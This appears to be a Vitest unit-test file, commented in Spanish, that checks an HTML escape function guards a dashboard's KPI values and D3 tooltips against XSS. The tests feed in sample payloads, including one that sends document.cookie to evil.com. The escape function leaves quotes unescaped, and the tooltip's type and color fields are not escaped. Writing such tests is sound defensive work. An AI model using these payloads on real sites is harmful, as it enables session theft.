/**
 * M-1 + M-2 — XSS escape tests
 *
 * La función esc() vive en fullsite.html línea ~2529.
 * La duplicamos aquí para tests unitarios aislados.
 * Si esc() se modifica en el HTML, actualizar aquí también.
 */

import { describe, it, expect } from 'vitest'

// ── esc() extraída de fullsite.html:2529 ─────────────────────────────────────
function esc(s) {
  return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// ── fmt() extraída de fullsite.html (KPI section) ───────────────────────────
function fmt(v) {
  return v != null ? (typeof v === 'number' ? v.toLocaleString('es-MX') : v) : '—'
}

// ── Tests de esc() ────────────────────────────────────────────────────────────

describe('esc() — HTML escape function', () => {
  it('no modifica texto plano sin caracteres especiales', () => {
    expect(esc('Hola Mundo')).toBe('Hola Mundo')
  })

  it('escapa < a &lt;', () => {
    expect(esc('<script>')).toBe('&lt;script&gt;')
  })

  it('escapa > a &gt;', () => {
    expect(esc('</script>')).toBe('&lt;/script&gt;')
  })

  it('escapa & a &amp;', () => {
    expect(esc('Tom & Jerry')).toBe('Tom &amp; Jerry')
  })

  it('escapa payload XSS completo', () => {
    const xss = '<img src=x onerror=alert(1)>'
    const escaped = esc(xss)
    expect(escaped).not.toContain('<')
    expect(escaped).not.toContain('>')
    expect(escaped).toBe('&lt;img src=x onerror=alert(1)&gt;')
  })

  it('escapa script tag', () => {
    const xss = '<script>alert("xss")</script>'
    const escaped = esc(xss)
    expect(escaped).not.toContain('<script>')
    expect(escaped).not.toContain('</script>')
  })

  it('maneja null → string vacío', () => {
    expect(esc(null)).toBe('')
  })

  it('maneja undefined → string vacío', () => {
    expect(esc(undefined)).toBe('')
  })

  it('maneja número (sin modificar)', () => {
    expect(esc(42)).toBe('42')
  })

  it('maneja string vacío', () => {
    expect(esc('')).toBe('')
  })

  it('escapa comillas simples — no son un vector en este contexto', () => {
    // esc() no escapa ' porque los atributos están entre backticks/dobles comillas
    // Documentamos comportamiento actual
    expect(esc("it's fine")).toBe("it's fine")
  })
})

// ── M-1 — KPI fields pasan por esc(fmt()) ────────────────────────────────────

describe('M-1 — KPI innerHTML: esc(fmt(value))', () => {
  const buildKpi = (value, prefix = '') =>
    `${prefix}<span>${esc(fmt(value))}</span>`

  it('valor numérico normal: sin cambios visibles', () => {
    const result = buildKpi(12345.50, '$')
    expect(result).toContain('12')
    expect(result).not.toContain('<script>')
  })

  it('valor null: muestra —', () => {
    expect(buildKpi(null)).toContain('—')
  })

  it('valor con XSS en string: escapado correctamente', () => {
    const malicious = '<script>alert(1)</script>'
    const result = buildKpi(malicious)
    expect(result).not.toContain('<script>')
    expect(result).toContain('&lt;script&gt;')
  })

  it('top_server con nombre malicioso: tag img escapado, no parseable como HTML', () => {
    const maliciousName = '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>'
    const result = `top server <span>${esc(fmt(maliciousName))}</span>`
    // El tag <img no debe aparecer como tag HTML real (con <)
    expect(result).not.toContain('<img')
    // El inicio del tag debe estar escapado como entidad
    expect(result).toContain('&lt;img')
    // El cierre tampoco debe aparecer como tag real
    expect(result).not.toContain('/>')
  })
})

// ── M-2 — Tooltip D3: d.label, d.desc, d.icon pasan por esc() ──────────────

describe('M-2 — D3 tooltip: esc() en label, desc, icon', () => {
  const buildTooltip = ({ icon, label, desc, type, color = '#00f5a0' }) =>
    `<div class="tt-name">${esc(icon)} ${esc(label)}</div>` +
    `<div style="color:#888;font-size:9px">${esc(desc)}</div>` +
    `<div class="tt-badge" style="background:${color}22;color:${color}">${type}</div>`

  it('nodo normal: renderiza correctamente', () => {
    const result = buildTooltip({
      icon: '🗄️', label: 'Supabase', desc: 'Base de datos', type: 'infra'
    })
    expect(result).toContain('Supabase')
    expect(result).toContain('Base de datos')
  })

  it('label con XSS: escapado en tt-name', () => {
    const result = buildTooltip({
      icon: '⚙', label: '<script>alert(1)</script>', desc: 'test', type: 'core'
    })
    expect(result).not.toContain('<script>')
    expect(result).toContain('&lt;script&gt;')
  })

  it('desc con XSS: escapado', () => {
    const result = buildTooltip({
      icon: '⚙', label: 'Test', desc: '<img onerror=alert(1)>', type: 'core'
    })
    expect(result).not.toContain('<img')
    expect(result).toContain('&lt;img')
  })

  it('icon con XSS: escapado', () => {
    const result = buildTooltip({
      icon: '<svg onload=alert(1)>', label: 'Test', desc: 'ok', type: 'core'
    })
    expect(result).not.toContain('<svg')
    expect(result).toContain('&lt;svg')
  })
})
